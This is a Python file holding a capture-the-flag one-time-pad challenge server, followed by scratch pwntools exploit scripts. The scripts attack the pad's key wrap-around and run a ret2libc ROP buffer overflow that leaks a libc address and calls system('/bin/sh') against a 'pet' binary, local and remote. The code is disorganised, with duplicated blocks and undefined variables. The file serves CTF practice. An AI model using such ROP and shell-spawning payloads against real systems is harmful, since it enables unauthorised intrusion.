#!/usr/bin/python3 -u
import os.path

KEY_FILE = "key"
KEY_LEN = 50000
FLAG_FILE = "flag"


def startup(key_location):  # 0  1st
	flag = open(FLAG_FILE).read()
	kf = open(KEY_FILE, "rb").read()

	start = key_location      #0
	stop = key_location + len(flag)

	key = kf[start:stop]
	key_location = stop

	result = list(map(lambda p, k: "{:02x}".format(ord(p) ^ k), flag, key))
	print("This is the encrypted flag!\n{}\n".format("".join(result)))

	return key_location

def encrypt(key_location):
	ui = input("What data would you like to encrypt? ").rstrip()
	if len(ui) == 0 or len(ui) > KEY_LEN:
		return -1

	start = key_location
	stop = key_location + len(ui)

	kf = open(KEY_FILE, "rb").read()

	if stop >= KEY_LEN:
		stop = stop % KEY_LEN
		key = kf[start:] + kf[:stop]
	else:
		key = kf[start:stop]
	key_location = stop

	result = list(map(lambda p, k: "{:02x}".format(ord(p) ^ k), ui, key))

	print("Here ya go!\n{}\n".format("".join(result)))

	return key_location


print("******************Welcome to our OTP implementation!******************")
c = startup(0)

while c >= 0:
	c = encrypt(c)

'''
from pwn import *

KEY_LEN = 50000
MAX_CHUNK = 1000

r = remote("mercury.picoctf.net", 58913)
r.recvuntil("This is the encrypted flag!\n")


flag = r.recvlineS(keepends = False)
log.info(f"Flag: {flag}")

bin_flag = unhex(flag)

counter = KEY_LEN - len(bin_flag)

with log.progress('Causing wrap-around') as p:
    while counter > 0:
        p.status(f"{counter} bytes left")
        chunk_size = min(MAX_CHUNK, counter)
        r.sendlineafter("What data would you like to encrypt? ", "a" * chunk_size)

        counter -= chunk_size

r.sendlineafter("What data would you like to encrypt? ", bin_flag)
r.recvlineS()
log.success("The flag: {}".format(unhex(r.recvlineS())))
# 32-bit
from pwn import *

p = process('./pet')

POP_FAKE = 0x00000000004004de
POP_RDI = 0x0000000000400743                        # Simply grab the libc it's running with
# Set base address
base= 0x00007ffff7800000
exit= base + 0x00000000000008aa
system = base+0x000000000004f420            # Grab location of system
binsh = base+0x1b3d88   # grab string location

print(p64(base2))
print(p64(POP_RDI))
print(p64(binsh))
print(p64(system))
print(p64(exit))


elf = context.binary = ELF('./pet')
p = process()

libc = elf.libc                        # Simply grab the libc it's running with
libc.address = 0x00007ffff7800000              # Set base address

system = libc.sym['system']            # Grab location of system
binsh = next(libc.search(b'/bin/sh'))  # grab string location




payload = b'A' * 72
payload += p64(POP_FAKE)
payload += p64(POP_RDI)
payload += p64(binsh)          # The padding
payload += p64(system)      # Location of system
payload += p64(exit)         # return pointer - not important once we get the shell
					       # pointer to command: /bin/sh


p.sendline(payload)
p.interactive()
-------------------------------------------------------------------------------------------------------
# 32-bit
from pwn import *
#context.log_level ='DEBUG'

elf = context.binary = ELF('./pet')
p = remote('83.136.249.230','49975')
#p = process('./pet')
libc =ELF('./glibc/libc.so.6')

#libc.address = 'base address setting'
#print(elf.plt.write)
#print(libc.sym.write)
#print(elf.got)
#print(elf.plt) 
#print(elf.sym)



POP_FAKE = 0x00000000004004de
POP_RDI = 0x400743      # Simply grab the libc it's running with
p1 = 1
# Set base address
POP_RSI = 0x400741 
p2 =0x600fd8
p3 = 0x8
POP_WRITE =0x4004f0

base= 0x00007ffff7800000
exit= base + 0x00000000000008aa
system = base+0x000000000004f420            # Grab location of system
binsh = base+0x1b3d88   # grab string location
main= elf.sym["main"]

#print(p64(POP_RDI))
#print(p64(binsh))
#print(p64(system))
#print(p64(exit))

'''

elf = context.binary = ELF('./pet')
p = process()

libc = elf.libc                        # Simply grab the libc it's running with
libc.address = 0x00007ffff7800000              # Set base address

system = libc.sym['system']            # Grab location of system
binsh = next(libc.search(b'/bin/sh'))  # grab string location

'''
write_got = elf.got["write"]
write_plt = elf.plt["write"]

print(hex(write_got))
print(hex(write_plt))

payload = b'A' * 72

payload += p64(POP_RDI)
payload += p64(p1)
payload += p64(POP_RSI)
payload += p64(p2)
payload += p64(p3)
payload += p64(POP_WRITE)
payload += p64(POP_FAKE)
payload += p64(main)

'''
payload += p64(binsh)          # The padding
payload += p64(system)      # Location of system
payload += p64(exit)         # return pointer - not important once we get the shell
					       # pointer to command: /bin/sh
'''
p.sendline(payload)
#x = p.recv(6).decode()

p.recvline()
p.recvline()
p.recvline()
p.recvline()
leak = p.recv(6)  #receive the byte thing
p.recvline()

#p.interactive()

#print(unpack(leak,'all'))
#x = hex (unpack(leak,'all'))  # bytes to integer
x = unpack(leak,'all') 
# Provided sequence
print(x)            #integer to hexadeciaml
#base = (hex(int(x,16 )- 0x1100f0))  #string to hexa 


# Convert bytes to hexadecimal
#leaker = hex(int.from_bytes(leak, byteorder='little'))

#print(leaker)

base = x - 1114352

exit= base + 0x00000000000008aa
system = base+0x000000000004f420            # Grab location of system
binsh = base+0x1b3d88   # grab string location



payload = b'A' * 72
payload += p64(POP_FAKE)
payload += p64(POP_RDI)
payload += p64(binsh)          # The padding
payload += p64(system)      # Location of system
payload += p64(exit)         # return pointer - not important once we get the shell
					 
p.sendline(payload)

p.interactive()
'''


